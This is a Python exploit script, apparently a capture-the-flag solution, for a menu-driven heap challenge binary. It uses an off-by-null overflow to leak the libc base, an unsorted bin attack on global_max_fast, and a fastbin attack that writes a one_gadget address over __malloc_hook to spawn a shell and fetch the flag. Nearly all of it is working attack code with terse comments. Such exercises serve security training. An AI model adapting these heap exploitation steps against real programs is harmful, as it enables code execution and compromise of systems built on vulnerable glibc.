#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(idx, size, data="deadbeef", is_attack=False):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    if not is_attack:
        p.sendafter("Content: ", data)


def update(idx, data):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("Content: ", data)


def show(idx):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Index: ", str(idx))
    p.recvuntil("content: ")
    m = p.recvline(0)
    info(f"Get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Index: ", str(idx))

"""procedure
1. off by null to leak
2. unsorted bin attack global_max_fast
2. fastbin attack
"""
add(0, 0x80)
add(1, 0xf8)
add(2, 0xf8)
add(3, 0xf0)
add(4, 0x10)

# off by null
dele(0) 
update(2, b"a"*0xf0 + p64(0x290))

# merge
dele(3)

# add
add(0, 0x80)

# leak 
m = show(1)
libc_base = u64_ex(m) - 0x3c4b78
log_libc_base_addr(libc_base)
libc.address = libc_base

# house of orange
add(3, 0x10)

global_max_fast_off = 0x3c67f8
payload = flat({
    0x18:[0x71, 0, libc_base + global_max_fast_off-0x10],
    0x80: [0, 0x21, 0, 0, 0, 0x21]
})
update(1, payload)

add(5, 0x60)

# get a fastbin chunk
dele(5)

payload = flat({
    0x18:[0x71, libc.sym['__malloc_hook']-0x23]
})
update(1, payload)

add(5, 0x60)

ags = get_current_one_gadget(libc_base)

add(6, 0x60, flat([0x13*"\x00", ags[2]]))
stop()
# trigger malloc_hook to get shell
dele(1)
dele(3)

get_flag_when_get_shell(p)

p.interactive()